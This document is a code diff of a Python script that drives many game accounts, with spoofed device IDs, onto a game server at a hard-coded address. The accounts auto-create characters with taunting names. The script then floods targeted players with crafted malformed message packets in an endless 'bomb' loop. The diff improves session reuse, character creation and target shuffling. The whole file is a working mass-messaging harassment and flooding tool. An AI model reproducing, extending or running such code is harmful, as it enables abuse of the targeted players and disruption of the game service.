@@ -12,7 +12,7 @@ import aiohttp
 import requests
 
 import socks
-from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, make_bad_msg_data, Session
+from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, make_bad_msg_data, Session, init_data, make_create_role_data
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
@@ -58,7 +58,7 @@ async def one(email, targets, wait=0):
     imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
     version = "1.5.60090"
     uid, token, session = None, None, None
-    # session_manager = Session(email)
+    session_manager = Session(email)
     while True:
         print("start:", email)
         #random.shuffle(proxies)
@@ -67,7 +67,6 @@ async def one(email, targets, wait=0):
         http_proxy = None
         try:
             try:
-                raise
                 uid, token, session = session_manager.get_session(email)
                 print("got session for", email)
                 login_type = "from sqlite"
@@ -76,23 +75,46 @@ async def one(email, targets, wait=0):
                     await asyncio.sleep(wait)
                     wait = 0
                 uid, token = await user_do(email, imei)
-                session = await login_verify(uid, token, version=version)
-                # session_manager.update_session(email, uid, token, session)
+                session_manager.update_session(email, uid, token, '')
                 login_type = "from http"
+            try:
+                session = await login_verify(uid, token, version=version)
+            except KeyError:
+                uid, token = await user_do(email, imei)
+                session_manager.update_session(email, uid, token, '')
+                session = await login_verify(uid, token, version=version)
 
-#            socks.set_default_proxy(socks.HTTP, host, int(port))
             fut = asyncio.open_connection('128.14.230.246', 30000)
             reader, writer = await asyncio.wait_for(fut, timeout=3)
             writer.write(make_logon_data(version, uid, imei, session))
             head = await reader.read(4)
             if head == b"":
                 print("fail to connect with type:", login_type)
-                # session_manager.delete_session(email)
+                session_manager.delete_session(email)
                 continue
             body_len = int.from_bytes(head, byteorder="big")
             body = b""
             while len(body) < body_len:
                 body += await reader.read(body_len - len(body))
+            r = init_data(body)
+            print(r)
+            if not "name" in r:
+                print("bug_email", email)
+                name_pool = '幸段謝羊彬穆品狄琴芬丁墨鑫先耀嵇計岑昝樺熹忠賀才躍杜彪彭黃孟支良道房賓隗高博蔣吾石洋婁謙山婷龐談顏鋼慈明貝文超蔔尤愛紹伯全硯雅清昊翁楠袁戴壇元皓浩敏霖戎乾沙裘春柳雄應卞輝崗俊洪濱張苗雷龍顧凱魏危樊郎琰翰妍江中若葉繆吉合樂花祖何松傳邦糜慧迎梓邱執冉梁畢夏宣隆鵬思彰趙純止伶宋萬蘇洲竇莉涯毛坤鋒旭光竣巫璿曲義埃阮暉傑寧漩喻紫新晗雲非亞谷嫣範淦富雪午逸勝甄和童康也時辰鄒學翊翔卓之湛珂任川葛韶郝宇徐暴晨詹西琦宸董容濤燕伊啟烏磊許曆影陶勃宵蔡瑋皮米興貴費豪車健餘呂閃成弓枚薛晏芮芪汪常行季剛繼恬路祈單宝賁利錢荔彎群馮鄭強仇曉銳維熊瑞王凡訪伏殊紅疏世韋珺力捷戚胡紀河志諾生嵐賈蕭涔陳滑鈄駱蓬玉鐘馬劉項基珈與炎尹智靳境滕民朱稚筱昌靜衛伍向賽章解書諸姚仙陽唐姜秋豔子祁汲仰孔儲然盧久懿孫牧金田言培嶽多天煒舒霍羲大俞英奕君樹銘勇國曼軒鬱根刁卿潘酆湯郭虞錦臧禹偉建禮景盛嚴曹宮梅本龔茅倪籽峻羅莫宓壹森鳳威連廉奚安仲施藝鋮欒煜柏邢茂侯鄧淼傅褚雁席珮榮閔耶齊楊騰程絢惠林吳殷方泰竹海淵華堅裴呈希乙麻秦家遠班孜平符水祥粟焦聆鈞昕韓儀左藍振杭斌祝琅宏藤顯邴飛臻士昆夜'
+                name_pool = list(name_pool)
+                magic_pool = list('古月娜滾出二十區')
+                models = [b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06']
+                random.shuffle(name_pool)
+                random.shuffle(models)
+                random.shuffle(magic_pool)
+                n = "".join(name_pool[:2]) + magic_pool[0] + "".join(name_pool[2:5])
+                data = make_create_role_data(n, models[0])
+                writer.write(data)
+            chapter, section = r['story_index']
+            if chapter == 1 and section == 1:
+                writer.write(b'\x00\x00\x00\x07\x00\x04\x00\x00\x00\x00\x03')
+            if chapter == 1 and section == 2:
+                writer.write(b'\x00\x00\x00\x07\x00\x04\x00\x00\x00\x00\x06')
             writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')    # seems like 2 cmd, each len is 7, read on screen players?  00 00 00 00 00 00 05 an
             head = await reader.read(4)
             body_len = int.from_bytes(head, byteorder="big")
@@ -107,8 +129,8 @@ async def one(email, targets, wait=0):
             i = 0
             print("bomb start------->>>>>>>")
             while True:
+                random.shuffle(targets)
                 for receiver in targets:
-                    writer.write(make_bad_msg_data(b'a'*20, receiver, 3))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 4))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 5))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 6))
@@ -119,15 +141,6 @@ async def one(email, targets, wait=0):
                     if i % 20 == 0:
                         writer.write(b'\x00\x00\x00\x02\x01\x00')
                     await reader.read(1024)
-                    #if i % 30 == 0:
-                    #    # read packages and do nothing
-                    #    head = await reader.read(4)
-                    #    body_len = int.from_bytes(head, byteorder="big")
-                    #    body = b""
-                    #    while len(body) < body_len:
-                    #        body += await reader.read(body_len - len(body))
-                # rd = lambda : random.randint(0,255).to_bytes(1, byteorder='big')
-                # writer.write(b"\x00\x00\x00\x0e\x01\x01\xf0\x7b\x05" + rd() + rd() + rd() + rd() + rd() + rd() + rd() + rd() + b"\x42")
         except BrokenPipeError:
             import traceback
             print(traceback.format_exc())
@@ -144,6 +157,7 @@ async def one(email, targets, wait=0):
         except:
             import traceback
             print("wtf!!!!", traceback.format_exc())
+            session_manager.delete_session(email)
             await asyncio.sleep(random.randint(20,60))
 
 
@@ -162,7 +176,7 @@ if __name__ == "__main__":
     conn = sqlite3.connect("data.db")
     conn.isolation_level = None   # auto commit
     c = conn.cursor()
-    c.execute("SELECT * FROM guards ORDER BY RANDOM() LIMIT 200")
+    c.execute("SELECT * FROM guards ORDER BY RANDOM() LIMIT 100")
     idx = 0
     for row in c.fetchall():
         idx += 1
